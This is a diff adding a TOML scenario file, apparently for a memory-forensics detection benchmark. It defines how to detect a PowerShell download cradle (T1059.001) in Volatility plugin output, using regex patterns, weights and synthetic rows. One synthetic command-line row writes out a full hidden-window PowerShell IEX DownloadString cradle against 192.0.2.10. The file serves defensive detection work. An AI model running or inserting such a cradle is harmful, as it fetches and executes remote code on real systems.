@@ -1,0 +1,65 @@
+id = "S01"
+name = "PowerShell download cradle"
+technique = "T1059.001"
+tactic = "execution"
+platform = "windows"
+environment = "onprem"
+timepoints = [0, 5, 15, 60]
+notes = """
+Reproduce with an Atomic Red Team T1059.001 download-cradle test against a
+snapshot-reverted victim VM in an isolated network. Image at each timepoint.
+Synthetic `p` values below are illustrative only.
+"""
+
+[[artefact]]
+id = "ps_cradle_cmdline"
+category = "execution"
+weight = 3
+plugin = "windows.cmdline.CmdLine"
+description = "Command line containing a download cradle."
+[artefact.match]
+Args = '(?i)(downloadstring|invoke-webrequest|\biwr\b).*https?://'
+[artefact.partial]
+Args = '(?i)powershell.*(-enc|-encodedcommand|-nop|-w(indowstyle)?\s+hidden)'
+[artefact.synthetic]
+p = [1.0, 0.9, 0.7, 0.4]
+row = { PID = 4321, Process = "powershell.exe", Args = "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/stage')" }
+partial_row = { PID = 4321, Process = "powershell.exe", Args = "powershell.exe -nop -w hidden -c ..." }
+
+[[artefact]]
+id = "ps_process"
+category = "execution"
+weight = 1
+plugin = "windows.pslist.PsList"
+description = "powershell.exe present in the process list."
+[artefact.match]
+ImageFileName = '(?i)^powershell(\.exe)?$'
+[artefact.synthetic]
+p = [1.0, 0.9, 0.7, 0.4]
+row = { PID = 4321, PPID = 1200, ImageFileName = "powershell.exe", ExitTime = "" }
+
+[[artefact]]
+id = "ps_network"
+category = "network"
+weight = 2
+plugin = "windows.netscan.NetScan"
+description = "Socket owned by powershell.exe."
+[artefact.match]
+Owner = '(?i)^powershell'
+State = 'ESTABLISHED|CLOSE_WAIT|TIME_WAIT|SYN_SENT'
+[artefact.synthetic]
+p = [1.0, 0.7, 0.3, 0.05]
+row = { PID = 4321, Owner = "powershell.exe", Proto = "TCPv4", ForeignAddr = "192.0.2.10", ForeignPort = 80, State = "ESTABLISHED" }
+
+[[artefact]]
+id = "ps_amsi_loaded"
+category = "execution"
+weight = 1
+plugin = "windows.dlllist.DllList"
+description = "AMSI loaded in the PowerShell process."
+[artefact.match]
+Process = '(?i)^powershell'
+Name = '(?i)^amsi\.dll$'
+[artefact.synthetic]
+p = [1.0, 0.9, 0.7, 0.4]
+row = { PID = 4321, Process = "powershell.exe", Name = "amsi.dll", Path = 'C:\Windows\System32\amsi.dll' }
